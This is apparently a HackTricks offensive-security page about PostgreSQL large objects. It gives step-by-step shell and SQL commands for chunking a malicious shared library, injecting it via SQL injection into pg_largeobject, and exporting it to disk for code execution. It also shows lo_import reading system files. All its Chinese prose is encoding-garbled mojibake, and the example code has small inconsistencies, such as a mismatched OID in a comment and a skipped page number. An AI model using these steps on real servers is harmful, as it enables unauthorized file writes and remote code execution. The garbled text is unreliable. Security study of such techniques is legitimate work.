<details>

<summary><strong>é›¶åŸºç¡€å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯æˆä¸ºé«˜æ‰‹</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# PostgreSQLå¤§å‹å¯¹è±¡

PostgreSQLå…¬å¼€äº†ä¸€ä¸ªç§°ä¸º**å¤§å‹å¯¹è±¡**ï¼ˆ`pg_largeobject`è¡¨ï¼‰çš„ç»“æ„ï¼Œç”¨äºå­˜å‚¨éš¾ä»¥å®Œæ•´å¤„ç†çš„æ•°æ®ï¼ˆå¦‚å›¾åƒæˆ–PDFæ–‡æ¡£ï¼‰ã€‚ä¸`COPY TO`åŠŸèƒ½ç›¸æ¯”ï¼Œ**å¤§å‹å¯¹è±¡**çš„ä¼˜åŠ¿åœ¨äºå®ƒä»¬**æŒæœ‰çš„æ•°æ®**å¯ä»¥**å¯¼å‡ºå›æ–‡ä»¶ç³»ç»Ÿ**ï¼Œä½œä¸º**åŸå§‹å¯¼å…¥æ–‡ä»¶çš„å®Œæ•´å‰¯æœ¬**ã€‚

ä¸ºäº†**åœ¨æ­¤è¡¨ä¸­ä¿å­˜å®Œæ•´æ–‡ä»¶**ï¼Œæ‚¨é¦–å…ˆéœ€è¦åœ¨æåˆ°çš„è¡¨ä¸­**åˆ›å»ºä¸€ä¸ªå¯¹è±¡**ï¼ˆç”±**LOID**æ ‡è¯†ï¼‰ï¼Œç„¶å**æ’å…¥2KBçš„æ•°æ®å—**åˆ°è¿™ä¸ªå¯¹è±¡ä¸­ã€‚éå¸¸é‡è¦çš„æ˜¯æ‰€æœ‰çš„**æ•°æ®å—éƒ½æ˜¯2KB**ï¼ˆå¯èƒ½é™¤äº†æœ€åä¸€ä¸ªï¼‰**æˆ–è€…**å¯¼å‡ºåˆ°æ–‡ä»¶ç³»ç»Ÿçš„**åŠŸèƒ½å°†æ— æ³•å·¥ä½œ**ã€‚

ä¸ºäº†å°†æ‚¨çš„**äºŒè¿›åˆ¶æ•°æ®**åˆ†å‰²æˆ**2KBå¤§å°çš„æ•°æ®å—**ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
ä¸ºäº†å°†æ¯ä¸ªåˆ›å»ºçš„æ–‡ä»¶ç¼–ç ä¸ºBase64æˆ–Hexï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
åœ¨åˆ©ç”¨è¿™ä¸ªæ¼æ´æ—¶ï¼Œè¯·è®°ä½ä½ å¿…é¡»å‘é€**2KBæ˜æ–‡å­—èŠ‚çš„å—**ï¼ˆä¸æ˜¯2KBçš„base64æˆ–åå…­è¿›åˆ¶ç¼–ç å­—èŠ‚ï¼‰ã€‚å¦‚æœä½ å°è¯•è‡ªåŠ¨åŒ–è¿™ä¸ªè¿‡ç¨‹ï¼Œ**åå…­è¿›åˆ¶ç¼–ç **æ–‡ä»¶çš„å¤§å°æ˜¯**åŒå€**ï¼ˆé‚£ä¹ˆä½ éœ€è¦ä¸ºæ¯ä¸ªå—å‘é€4KBçš„ç¼–ç æ•°æ®ï¼‰ï¼Œè€Œ**base64**ç¼–ç æ–‡ä»¶çš„å¤§å°æ˜¯`ceil(n / 3) * 4`
{% endhint %}

æ­¤å¤–ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œä½ å¯ä»¥æŸ¥çœ‹åˆ›å»ºçš„å¤§å‹å¯¹è±¡çš„å†…å®¹ï¼š
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# ä½¿ç”¨ lo\_creat & Base64

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª LOIDï¼Œç”¨äºä¿å­˜äºŒè¿›åˆ¶æ•°æ®ï¼š
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
å¦‚æœæ‚¨æ­£åœ¨åˆ©ç”¨**ç›²ç›®SQLæ³¨å…¥**ï¼Œæ‚¨ä¼šæ›´æ„Ÿå…´è¶£ä½¿ç”¨`lo_create`æ­é…ä¸€ä¸ª**å›ºå®šçš„LOID**ï¼Œè¿™æ ·æ‚¨å°±**çŸ¥é“åœ¨å“ªé‡Œ**éœ€è¦**ä¸Šä¼ **å†…å®¹ã€‚\
å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œå‡½æ•°åç§°æ˜¯`lo_creat`å’Œ`lo_create`ï¼Œè¿™é‡Œæ²¡æœ‰è¯­æ³•é”™è¯¯ã€‚

LOIDç”¨äºåœ¨`pg_largeobject`è¡¨ä¸­è¯†åˆ«å¯¹è±¡ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å°†2KBå¤§å°çš„æ•°æ®å—æ’å…¥åˆ°`pg_largeobject`è¡¨ä¸­ï¼š
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
```markdown
æœ€åï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œå°†æ–‡ä»¶å¯¼å‡ºåˆ°æ–‡ä»¶ç³»ç»Ÿï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ä½¿ç”¨çš„ LOID æ˜¯ `173454`ï¼‰ï¼š
```
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„ postgres ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦**ä¸æŒ‡å®šä»»ä½•è·¯å¾„**å°±**ä¸Šä¼ æ‰©å±•**ã€‚[**é˜…è¯»æ­¤å†…å®¹ä»¥è·å–æ›´å¤šä¿¡æ¯**ã€‚](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

æ‚¨å¯èƒ½å¯¹åœ¨å¯¼å‡ºå¤§å‹å¯¹è±¡ååˆ é™¤å®ƒæ„Ÿå…´è¶£ï¼š
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# ä½¿ç”¨ lo\_import & Hex

åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œå°†ä½¿ç”¨ lo\_import æ¥åˆ›å»ºä¸€ä¸ªå¤§å‹å¯¹è±¡ã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ï¼ˆä¹Ÿä¸èƒ½ï¼‰æŒ‡å®šä½ æƒ³è¦ä½¿ç”¨çš„ LOIDï¼š
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
åœ¨åˆ›å»ºå¯¹è±¡åï¼Œæ‚¨å¯ä»¥å¼€å§‹åœ¨æ¯ä¸ªé¡µé¢ä¸Šæ’å…¥æ•°æ®ï¼ˆè®°ä½ï¼Œæ‚¨å¿…é¡»æ’å…¥2KBçš„æ•°æ®å—ï¼‰ï¼š
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEX å¿…é¡»åªåŒ…å«åå…­è¿›åˆ¶æ•°ï¼ˆä¸åŒ…æ‹¬ `0x` æˆ– `\x`ï¼‰ï¼Œä¾‹å¦‚ï¼š
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
æœ€åï¼Œå°†æ•°æ®å¯¼å‡ºåˆ°æ–‡ä»¶å¹¶åˆ é™¤å¤§å‹å¯¹è±¡ï¼š
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„PostgreSQLä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦**ä¸æŒ‡å®šä»»ä½•è·¯å¾„**å°±**ä¸Šä¼ æ‰©å±•**ã€‚[**é˜…è¯»æ­¤å†…å®¹ä»¥è·å–æ›´å¤šä¿¡æ¯**ã€‚](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# é™åˆ¶

é˜…è¯»PostgreSQLä¸­çš„å¤§å‹å¯¹è±¡æ–‡æ¡£åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°**å¤§å‹å¯¹è±¡å¯ä»¥æœ‰ACL**ï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€‚å¯ä»¥é…ç½®**æ–°çš„å¤§å‹å¯¹è±¡**ï¼Œä½¿æ‚¨çš„ç”¨æˆ·å³ä½¿æ˜¯ç”±æ‚¨çš„ç”¨æˆ·åˆ›å»ºçš„ï¼Œä¹Ÿ**æ²¡æœ‰è¶³å¤Ÿçš„æƒé™**æ¥è¯»å–å®ƒä»¬ã€‚

ç„¶è€Œï¼Œå¯èƒ½å­˜åœ¨**æ—§å¯¹è±¡çš„ACLå…è®¸å½“å‰ç”¨æˆ·è¯»å–å®ƒ**ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ³„éœ²è¯¥å¯¹è±¡çš„å†…å®¹ã€‚


<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
